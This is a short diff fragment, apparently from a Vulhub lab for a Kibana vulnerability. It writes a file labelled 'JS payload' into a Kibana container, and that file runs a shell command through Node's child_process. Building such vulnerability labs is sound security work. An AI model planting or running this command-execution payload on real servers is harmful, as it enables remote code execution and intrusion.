@@ -1,0 +1,9 @@
+$ docker compose exec kibana bash -c 'cat > /tmp/vulhub.js'   # JS payload
+
+export default {
+  asJson: function (req, res) {
+    return require("child_process").execSync("id").toString();
+  }
+}
+
+exec_exit=0
